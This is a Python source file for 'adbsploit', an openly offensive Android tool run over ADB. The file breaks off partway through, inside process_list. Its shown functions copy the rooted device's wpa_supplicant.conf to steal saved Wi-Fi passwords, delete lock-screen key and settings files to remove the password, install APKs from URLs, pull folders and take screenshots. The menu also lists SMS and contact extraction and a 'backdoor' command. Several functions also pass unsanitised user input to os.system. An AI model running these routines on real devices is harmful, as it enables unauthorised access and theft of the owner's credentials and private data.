#!/usr/bin/python3
# coding: utf8

try:
    import os
    import shutil
    import subprocess
    import sys
    import random
    import adbutils
    from colorama import Fore
    from pyfiglet import Figlet
    from rich.console import Console
    from rich.table import Table
except:
    print('\x1b[0;31mSome deependencies not installed.')
    print('RUN: "pip install colorama rich adbutils pyfiglet" to install missing items.')
    sys.exit(1)
    
# ***********************************************************************
# Variables and main
arrow = Fore.RED + " └──>" + Fore.WHITE
device = 'none'


def my_input(text):
    try:
        return input(text)
    except:
        print(Fore.RED + '[*] ' + Fore.YELLOW + 'Exit.')
        sys.exit(1)

def main():
    command = my_input(Fore.WHITE + "adbsploit" + Fore.RED + "(" + device + ")" + Fore.WHITE + " > ")
    if command == 'help':
        help()
        main()
    elif command == 'devices':
        devices()
        main()
    elif command == 'select':
        select()
        main()
    elif command == 'connect':
        connect()
        main()
    elif command == 'list-forward':
        list_forward()
        main()
    elif command == 'forward':
        forward()
        main()
    elif command == 'wifi':
        wifi()
        main()
    elif command == 'airplane':
        airplane()
        main()
    elif command == 'dumpsys':
        dumpsys()
        main()
    elif command == 'list-apps':
        list_apps()
        main()
    elif command == 'wpa-supplicant':
        wpa_supplicant()
        main()
    elif command == 'start-app':
        start_app()
        main()
    elif command == 'stop-app':
        stop_app()
        main()
    elif command == 'clear-app':
        clear_app()
        main()
    elif command == 'install':
        install()
        main()
    elif command == 'install-remote':
        install_remote()
        main()
    elif command == 'uninstall':
        uninstall()
        main()
    elif command == 'shell':
        shell()
        main()
    elif command == 'shutdown':
        shutdown()
        main()
    elif command == 'reboot':
        reboot()
        main()
    elif command == 'kill-server':
        kill_server()
        main()
    elif command == 'get-folder':
        get_folder()
        main()
    elif command == 'logs':
        logs()
        main()
    elif command == 'show_ip':
        show_ip()
        main()
    elif command == 'battery':
        battery()
        main()
    elif command == 'appinfo':
        appinfo()
        main()
    elif command == 'netstat':
        netstat()
        main()
    elif command == 'sound':
        sound()
        main()
    elif command == 'check-screen':
        check_screen()
        main()
    elif command == 'dump-hierarchy':
        dump_hierarchy()
        main()
    elif command == 'keyevent':
        keyevent()
        main()
    elif command == 'show-keyevents':
        show_keyevents()
        main()
    elif command == 'open-browser':
        open_browser()
        main()
    elif command == 'remove-password':
        remove_password()
        main()
    elif command == 'swipe':
        swipe()
        main()
    elif command == 'screen':
        screen()
        main()
    elif command == 'unlock-screen':
        unlock_screen()
        main()
    elif command == 'lock-screen':
        lock_screen()
        main()
    elif command == 'show-mac':
        show_macaddress()
        main()
    elif command == 'screenshot':
        screenshot()
        main()
    elif command == 'dump-meminfo':
        dump_meminfo()
        main()
    elif command == 'process-list':
        process_list()
        main()
    elif command == 'tcpip':
        tcpip()
        main()
    elif command == 'current-app':
        current_app()
        main()
    elif command == 'extract-contacts':
        extract_contacts()
        main()
    elif command == 'extract-sms':
        extract_sms()
        main()
    elif command == 'delete-sms':
        delete_sms()
        main()
    elif command == 'send-sms':
        send_sms()
        main()
    elif command == 'extract-app':
        extract_app()
        main()
    elif command == 'recovery-mode':
        recovery_mode()
        main()
    elif command == 'device-info':
        device_info()
        main()
    elif command == 'fastboot-mode':
        fastboot_mode()
        main()
    elif command == 'kill-process':
        kill_process()
        main()
    elif command == 'screenrecord':
        screenrecord()
        main()
    elif command == 'remote-control':
        remote_control()
        main()
    elif command == 'backdoor':
        backdoor()
        main()
    elif command == 'clear':
        clear()
        main()
    elif command == 'version':
        version()
        main()
    elif command == 'exit':
        exit()
    else:
        print(arrow + Fore.RED + " That command doesn't exists...")
        main()


# *******************************************************************************
# Functions

def devices(rstuff=False):
    '''devices'''
    table = Table()
    if rstuff:
        count = 1
        devicedict = {}
        table.add_column("Choice", style="cyan")
        table.add_column("Device detected", style="cyan")
        table.add_column("Model", style="magenta")
        table.add_column("Name", style="magenta")
        table.add_column("Device", style="magenta")
        for d in adbutils.adb.device_list():
            table.add_row( str(count), d.serial, d.prop.model, d.prop.name, d.prop.device)
            devicedict[str(count)] = d.serial
            count += 1
        console = Console()
        console.print(table)
        return devicedict
        
    else:
        table.add_column("Device detected", style="cyan")
        table.add_column("Model", style="magenta")
        table.add_column("Name", style="magenta")
        table.add_column("Device", style="magenta")
        for d in adbutils.adb.device_list():
            table.add_row(d.serial, d.prop.model, d.prop.name, d.prop.device)
        console = Console()
        console.print(table)


def connect():
    print(("[{0}+{1}] Enter the phone IP address to connect").format(Fore.RED, Fore.WHITE))
    dev = my_input(arrow + " adbsploit" + Fore.RED + "(connect) " + Fore.WHITE + "> ")
    output = adbutils.adb.connect(dev)
    print(arrow + Fore.GREEN + " * " + output)


def select():
    devicedict = devices(True)
    print(("[{0}+{1}] Choose Device").format(Fore.RED, Fore.WHITE))
    dev = my_input(arrow + " adbsploit" + Fore.RED + "(select) " + Fore.WHITE + "> ")
    try:
        output = adbutils.adb.device(serial=devicedict[dev])
        global device
        try:
            output.is_screen_on()
            print("Selected device: " + Fore.GREEN + output.serial)
            device = output.serial
            main()
        except:
            print(arrow + ("[{0}+{1}] That device doesn't exist...").format(Fore.RED, Fore.WHITE))
    except:
        print(arrow + ("[{0}+{1}] That device doesn't exist...").format(Fore.RED, Fore.WHITE))
    

def list_forward():
    global device
    table = Table()
    table.add_column("Device", style="cyan")
    table.add_column("Local Port", style="magenta")
    table.add_column("Remote Port", style="magenta")
    if device != 'none':
        # list only one device forwards
        for item in adbutils.adb.forward_list(device):
            table.add_row(item.serial, item.local, item.remote)
        console = Console()
        console.print(table)
    else:
        # list all forwards
        for item in adbutils.adb.forward_list():
            table.add_row(item.serial, item.local, item.remote)
        console = Console()
        console.print(table)


def forward():
    global device
    if device != 'none':
        print(("[{0}+{1}] Enter the local port to foward").format(Fore.RED, Fore.WHITE))
        local = my_input(arrow + " adbsploit" + Fore.RED + "(forward) " + Fore.WHITE + "> ")
        print(("[{0}+{1}] Enter the remote port to forward").format(Fore.RED, Fore.WHITE))
        remote = my_input(arrow + " adbsploit" + Fore.RED + "(forward) " + Fore.WHITE + "> ")
        d = adbutils.adb.device(device)
        output = d.forward(local, remote)
        print(output)
        print(Fore.GREEN + "The port forward is now active...")
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def wifi():
    global device
    if device != 'none':
        d = adbutils.adb.device(device)
        print(("[{0}+{1}] Enter the state of the wifi (ON/OFF)").format(Fore.RED, Fore.WHITE))
        state = my_input(arrow + " adbsploit" + Fore.RED + "(wifi) " + Fore.WHITE + "> ")
        if state == 'on' or state == 'ON':
            d.shell('svc wifi enable')
            print(arrow + Fore.GREEN + 'The wifi is now enabled on the device')
        elif state == 'off' or state == 'OFF':
            d.shell('svc wifi disable')
            print(
                arrow + Fore.GREEN + 'The wifi is now disabled on the device. To turn it on again you must plugged in')
        else:
            print(arrow + ("[{0}+{1}] That state doesn't exists").format(Fore.RED, Fore.WHITE))
            wifi()
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def dumpsys():
    global device
    if device != 'none':
        d = adbutils.adb.device(device)
        print(arrow + d.shell(device + ' dumpsys'))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def list_apps():
    global device
    if device != 'none':
        d = adbutils.adb.device(device)
        apps = d.list_packages()
        table = Table()
        table.add_column("App", style="cyan")
        for a in apps:
            table.add_row(a)
        console = Console()
        console.print(table)
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def wpa_supplicant():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            d.shell("su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
            d.sync.pull("/sdcard/wpa_supplicant.conf", "wpa_supplicant.conf")
            # d.shell(device + " pull /sdcard/wpa_supplicant.conf "+location)
            print(arrow + Fore.GREEN + 'WPA Supplicant exported correctly')
        except:
            print(arrow + Fore.RED + 'An error has been occurred grabbing the wpa_supplicant')
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def install():
    global device
    if device != 'none':
        try:
            print(("[{0}+{1}] Enter the apk path").format(Fore.RED, Fore.WHITE))
            apk = my_input(arrow + " adbsploit" + Fore.RED + "(install) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.install(apk)
            print(arrow + Fore.GREEN + 'APK installed successfully')
        except:
            print(
                arrow + Fore.RED + 'An error has been occurred installing the APK. Check the path or the error related')
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def install_remote():
    global device
    if device != 'none':
        try:
            print(("[{0}+{1}] Enter the apk URL").format(Fore.RED, Fore.WHITE))
            url = my_input(arrow + " adbsploit" + Fore.RED + "(install_remote) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.install_remote(url)
            print(arrow + Fore.GREEN + 'APK installed successfully')
        except:
            print(
                arrow + Fore.RED + 'An error has been occurred installing the APK. Check the path or the error related')
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def uninstall():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Enter the package name").format(Fore.RED, Fore.WHITE))
            app = my_input(arrow + " adbsploit" + Fore.RED + "(uninstall) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.uninstall(app)
            print(arrow + Fore.GREEN + 'APK uninstalled successfully')
        except:
            print(
                arrow + Fore.RED + 'An error has been occurred uninstalling the APK. Check the package name or the error related')
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def shell():
    global device
    if device != 'none':
        try:
            os.system("adb -s " + device + " shell")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred opening the shell...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def shutdown():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            d.shell('reboot -p')
            print(arrow + Fore.GREEN + 'The device is shutting down...')
        except:
            print(arrow + ("[{0}+{1}] An error ocurred shutting down the device").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def reboot():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            d.shell('reboot')
            print(arrow + Fore.GREEN + 'The device is rebooting...')
        except:
            print(arrow + ("[{0}+{1}] An error ocurred opening the shell...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def kill_server():
    try:
        adbutils.adb.server_kill()
        print(arrow + Fore.GREEN + 'The server is down...')
    except:
        print(arrow + ("[{0}+{1}] An error ocurred killing the server...").format(Fore.RED, Fore.WHITE))


def get_folder():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Enter the path of the folder to pull").format(Fore.RED, Fore.WHITE))
            path = my_input(arrow + " adbsploit" + Fore.RED + "(get_folder) " + Fore.WHITE + "> ")
            print(arrow + ("[{0}+{1}] Enter the path of the destination").format(Fore.RED, Fore.WHITE))
            name = my_input(arrow + " adbsploit" + Fore.RED + "(get_folder) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.sync.pull(path, name)
        except:
            print(arrow + ("[{0}+{1}] An error ocurred pulling the folder...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def logs():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] You want all the logs or only an app? (all/package_name) ").format(Fore.RED,
                                                                                                         Fore.WHITE))
            app = my_input(arrow + " adbsploit" + Fore.RED + "(logs) " + Fore.WHITE + "> ")
            if app == "all":
                os.system('adb -s ' + device + " logcat ")
            else:
                os.system('adb -s ' + device + " logcat " + "app")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred getting the logs...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def start_app():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(Fore.RED, Fore.WHITE))
            app = my_input(arrow + " adbsploit" + Fore.RED + "(start_app) " + Fore.WHITE + "> ")
            print(arrow + ("[{0}+{1}] Specify the activity, if not leave it blank) ").format(Fore.RED, Fore.WHITE))
            activity = my_input(arrow + " adbsploit" + Fore.RED + "(start_app) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            if activity == '':
                d.app_start(app)
                print(Fore.GREEN + "The app " + app + " is now starting...")
            else:
                d.app_start(app, activity)
                print(Fore.GREEN + "The app " + app + "with the activity " + activity + " is now starting...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred starting the app...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def stop_app():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(Fore.RED, Fore.WHITE))
            app = my_input(arrow + " adbsploit" + Fore.RED + "(stop_app) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.app_stop(app)
            print(Fore.GREEN + "The app " + app + " is now stopped...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred stopping the app...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def clear_app():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(Fore.RED, Fore.WHITE))
            app = my_input(arrow + " adbsploit" + Fore.RED + "(clear_app) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.app_clear(app)
            print(Fore.GREEN + "The app " + app + " is now clear...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred starting the app...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def show_ip():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            ip = d.wlan_ip()
            print(arrow + Fore.GREEN + ip)
        except:
            print(arrow + ("[{0}+{1}] An error ocurred showing the ip...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def appinfo():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(Fore.RED, Fore.WHITE))
            app = my_input(arrow + " adbsploit" + Fore.RED + "(appinfo) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            print(Fore.GREEN + str(d.package_info(app)))
        except:
            print(arrow + ("[{0}+{1}] An error ocurred obtaining the info...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def battery():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            bat = d.shell("dumpsys battery")
            print(Fore.GREEN + bat)
        except:
            print(arrow + ("[{0}+{1}] An error ocurred obtaining the battery info...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def netstat():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            bat = d.shell("netstat")
            print(arrow + Fore.GREEN + "The netstat for device " + device + " is:")
            print(Fore.MAGENTA + bat)
        except:
            print(arrow + ("[{0}+{1}] An error ocurred getting the netstat...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def airplane():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(Fore.RED, Fore.WHITE))
            status = my_input(arrow + " adbsploit" + Fore.RED + "(airplane) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            if status == 'on':
                d.switch_airplane(True)
                print(arrow + Fore.GREEN + "The Airplane Mode is activated...")
            elif status == 'off':
                d.switch_airplane(False)
                print(arrow + Fore.GREEN + "The Airplane Mode is deactivated...")
            else:
                print(arrow + Fore.RED + "The status value only accepts on or off")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred with airplane mode...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def sound():
    global device
    if device != 'none':
        try:
            print(
                arrow + ("[{0}+{1}] Specify the type of sound to modify (media/call/system/notifications/all) ").format(
                    Fore.RED, Fore.WHITE))
            type = my_input(arrow + " adbsploit" + Fore.RED + "(sound) " + Fore.WHITE + "> ")
            print(arrow + ("[{0}+{1}] Specify the sound leve 0-15 ").format(Fore.RED, Fore.WHITE))
            set = my_input(arrow + " adbsploit" + Fore.RED + "(sound) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            if type == 'media':
                d.shell('media volume --stream 3 --set ' + set)
                print(arrow + Fore.GREEN + 'The media volume is now set to ' + set + '...')
            elif type == 'call':
                d.shell('media volume --stream 0 --set ' + set)
                print(arrow + Fore.GREEN + 'The call volume is now set to ' + set + '...')
            elif type == 'system':
                d.shell('media volume --stream 1 --set ' + set)
                print(arrow + Fore.GREEN + "The system volume is now set to " + set + '...')
            elif type == 'notifications':
                d.shell('media volume --stream 2 --set ' + set)
                print(arrow + Fore.GREEN + 'The notifications volume is now set to ' + set + '...')
            elif type == 'all':
                d.shell()
                d.shell('media volume --stream 3 --set ' + set)
                d.shell('media volume --stream 2 --set ' + set)
                d.shell('media volume --stream 1 --set ' + set)
                d.shell('media volume --stream 0 --set ' + set)
                print(arrow + Fore.GREEN + 'The all volume types is now set to ' + set + '...')
            else:
                print(Fore.RED + "This type doesn't exists...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred with the sound...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def check_screen():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            screen = d.is_screen_on()
            if screen == True:
                print(arrow + Fore.GREEN + 'The screen is on...')
            else:
                print(arrow + Fore.GREEN + 'The screen is off...')
        except:
            print(arrow + ("[{0}+{1}] An error ocurred checking the screen...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def dump_hierarchy():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            print(arrow + Fore.GREEN + d.dump_hierarchy())
        except:
            print(arrow + ("[{0}+{1}] An error ocurred dumping hierarchy...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def keyevent():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the keyevent").format(Fore.RED, Fore.WHITE))
            key = my_input(arrow + " adbsploit" + Fore.RED + "(keyevent) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.keyevent(key)
            print(arrow + Fore.GREEN + "They key event is processed correctly...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred dumping hierarchy...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def show_keyevents(self):
    table = Table()
    table.add_column("Code", style="cyan")
    table.add_column("Keycode", style="magenta")
    table.add_row("0", "KEYCODE_UNKNOWN")
    table.add_row("1", "KEYCODE_MENU")
    table.add_row("2", "KEYCODE_SOFT_RIGHT")
    table.add_row("3", "KEYCODE_HOME")
    table.add_row("4", "KEYCODE_BACK")
    table.add_row("5", "KEYCODE_CALL")
    table.add_row("6", "KEYCODE_ENDCALL")
    table.add_row("7", "KEYCODE_0")
    table.add_row("8", "KEYCODE_1")
    table.add_row("9", "KEYCODE_2")
    table.add_row("10", "KEYCODE_3")
    table.add_row("11", "KEYCODE_4")
    table.add_row("12", "KEYCODE_5")
    table.add_row("13", "KEYCODE_6")
    table.add_row("14", "KEYCODE_7")
    table.add_row("15", "KEYCODE_8")
    table.add_row("16", "KEYCODE_9")
    table.add_row("17", "KEYCODE_STAR")
    table.add_row("18", "KEYCODE_POUND")
    table.add_row("19", "KEYCODE_DPAD_UP")
    table.add_row("20", "KEYCODE_DPAD_DOWN")
    table.add_row("21", "KEYCODE_DPAD_LEFT")
    table.add_row("22", "KEYCODE_DPAD_RIGHT")
    table.add_row("23", "KEYCODE_DPAD_CENTER")
    table.add_row("24", "KEYCODE_VOLUME_UP")
    table.add_row("25", "KEYCODE_VOLUME_DOWN")
    table.add_row("26", "KEYCODE_POWER")
    table.add_row("27", "KEYCODE_CAMERA")
    table.add_row("28", "KEYCODE_CLEAR")
    table.add_row("29", "KEYCODE_A")
    table.add_row("30", "KEYCODE_B")
    table.add_row("31", "KEYCODE_C")
    table.add_row("32", "KEYCODE_D")
    table.add_row("33", "KEYCODE_E")
    table.add_row("34", "KEYCODE_F")
    table.add_row("35", "KEYCODE_G")
    table.add_row("36", "KEYCODE_H")
    table.add_row("37", "KEYCODE_I")
    table.add_row("38", "KEYCODE_J")
    table.add_row("39", "KEYCODE_K")
    table.add_row("40", "KEYCODE_L")
    table.add_row("41", "KEYCODE_M")
    table.add_row("42", "KEYCODE_N")
    table.add_row("43", "KEYCODE_O")
    table.add_row("44", "KEYCODE_P")
    table.add_row("45", "KEYCODE_Q")
    table.add_row("46", "KEYCODE_R")
    table.add_row("47", "KEYCODE_S")
    table.add_row("48", "KEYCODE_T")
    table.add_row("49", "KEYCODE_U")
    table.add_row("50", "KEYCODE_V")
    table.add_row("51", "KEYCODE_W")
    table.add_row("52", "KEYCODE_X")
    table.add_row("53", "KEYCODE_Y")
    table.add_row("54", "KEYCODE_Z")
    table.add_row("55", "KEYCODE_COMMA")
    table.add_row("56", "KEYCODE_PERIOD")
    table.add_row("57", "KEYCODE_ALT_LEFT")
    table.add_row("58", "KEYCODE_ALT_RIGHT")
    table.add_row("59", "KEYCODE_SHIFT_LEFT")
    table.add_row("60", "KEYCODE_SHIFT_RIGHT")
    table.add_row("61", "KEYCODE_TAB")
    table.add_row("62", "KEYCODE_SPACE")
    table.add_row("63", "KEYCODE_SYM")
    table.add_row("64", "KEYCODE_EXPLORER")
    table.add_row("65", "KEYCODE_ENVELOPE")
    table.add_row("66", "KEYCODE_ENTER")
    table.add_row("67", "KEYCODE_DEL")
    table.add_row("68", "KEYCODE_GRAVE")
    table.add_row("69", "KEYCODE_MINUS")
    table.add_row("70", "KEYCODE_EQUALS")
    table.add_row("71", "KEYCODE_LEFT_BRACKET")
    table.add_row("72", "KEYCODE_RIGHT_BRACKET")
    table.add_row("73", "KEYCODE_BACKSLASH")
    table.add_row("74", "KEYCODE_SEMICOLON")
    table.add_row("75", "KEYCODE_APOSTROPHE")
    table.add_row("76", "KEYCODE_SLASH")
    table.add_row("77", "KEYCODE_AT")
    table.add_row("78", "KEYCODE_NUM")
    table.add_row("79", "KEYCODE_HEADSETHOOK")
    table.add_row("80", "KEYCODE_FOCUS")
    table.add_row("81", "KEYCODE_PLUS")
    table.add_row("82", "KEYCODE_MENU")
    table.add_row("83", "KEYCODE_NOTIFICATION")
    table.add_row("84", "KEYCODE_SEARCH")
    table.add_row("85", "TAG_LAST_KEYCODE")
    console = Console()
    console.print(table)


def open_browser():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the URL to open").format(Fore.RED, Fore.WHITE))
            url = my_input(arrow + " adbsploit" + Fore.RED + "(open_browser) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            if url != '':
                d.open_browser(url)
                print(arrow + Fore.GREEN + 'The url ' + url + ' is now opening...')
            else:
                print(arrow + Fore.RED + 'The URL can not be null...')
        except:
            print(arrow + ("[{0}+{1}] An error ocurred opening the url...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def remove_password():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            print(arrow + Fore.RED + 'Trying to remove lockscreen password...')
            d1 = d.shell("su 0 'rm /data/system/gesture.key'")
            print(arrow + d1)
            d2 = d.shell("su 0 'rm /data/system/locksettings.db'")
            print(arrow + d2)
            d3 = d.shell("su 0 'rm /data/system/locksettings.db-wal'")
            print(arrow + d3)
            d4 = d.shell("su 0 'rm /data/system/locksettings.db-shm'")
            print(arrow + d4)
        except:
            print(arrow + ("[{0}+{1}] An error ocurred removing the password...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def swipe():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify sx in the screen").format(Fore.RED, Fore.WHITE))
            sx = my_input(arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> ")
            print(arrow + ("[{0}+{1}] Specify sy in the screen").format(Fore.RED, Fore.WHITE))
            sy = my_input(arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> ")
            print(arrow + ("[{0}+{1}] Specify ex in the screen").format(Fore.RED, Fore.WHITE))
            ex = my_input(arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> ")
            print(arrow + ("[{0}+{1}] Specify ey in the screen").format(Fore.RED, Fore.WHITE))
            ey = my_input(arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> ")
            print(arrow + ("[{0}+{1}] Specify the duration").format(Fore.RED, Fore.WHITE))
            duration = my_input(arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.swipe(sx, sy, ex, ey, duration)
            print(arrow + Fore.GREEN + ("The swipe is made..."))
        except:
            print(arrow + ("[{0}+{1}] An error ocurred during the swipe...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def screen():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the status of the screen (on/off)").format(Fore.RED, Fore.WHITE))
            status = my_input(arrow + " adbsploit" + Fore.RED + "(screen) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            if status == 'on':
                d.switch_screen(True)
                print(arrow + Fore.GREEN + ("The screen is on..."))
            elif status == 'off':
                d.switch_screen(False)
                print(arrow + Fore.GREEN + ("The screen is off..."))
            else:
                print(Fore.RED + "That option doesn't exists...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred during the swipe...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def unlock_screen():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            if d.is_screen_on() == False:
                print(
                    arrow + ("[{0}+{1}] Specify the unlocking code, leave it blank if don't have code").format(Fore.RED,
                                                                                                               Fore.WHITE))
                code = my_input(arrow + " adbsploit" + Fore.RED + "(unlock_screen) " + Fore.WHITE + "> ")
                d.switch_screen(True)
                d.swipe(200, 900, 200, 300, 0.5)
                d.shell("input text " + str(code))
                d.keyevent(66)
                print(arrow + Fore.GREEN + "The screen is unlocked...")
            else:
                print(arrow + Fore.GREEN + "The screen is already unlocked...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred unlocking the device...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def lock_screen():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            d.keyevent(26)
            print(Fore.GREEN + "The screen is now locked...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred unlocking the device...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def show_macaddress():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            print(arrow + Fore.GREEN + d.shell("cat /sys/class/net/wlan0/address"))
        except:
            print(arrow + ("[{0}+{1}] An error ocurred showing the mac address...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def screenshot():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the name of the screenshot").format(Fore.RED, Fore.WHITE))
            name = my_input(arrow + " adbsploit" + Fore.RED + "(screenshot) " + Fore.WHITE + "> ")
            os.system("adb -s " + device + " exec-out screencap -p >" + name + ".png")
            print(arrow + Fore.GREEN + "An image is created with the name " + name + ".png ...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred making the screenshot...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def dump_meminfo():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the meminfo (all/package_name)").format(Fore.RED, Fore.WHITE))
            app = my_input(arrow + " adbsploit" + Fore.RED + "(dump_meminfo) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            if app == 'all':
                print(arrow + Fore.GREEN + d.shell("dumpsys meminfo"))
            else:
                print(arrow + Fore.GREEN + d.shell("dumpsys meminfo " + app))
        except:
            print(arrow + ("[{0}+{1}] An error ocurred dumping the meminfo...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def process_list():
    global device
    if device != 'none':
        try:
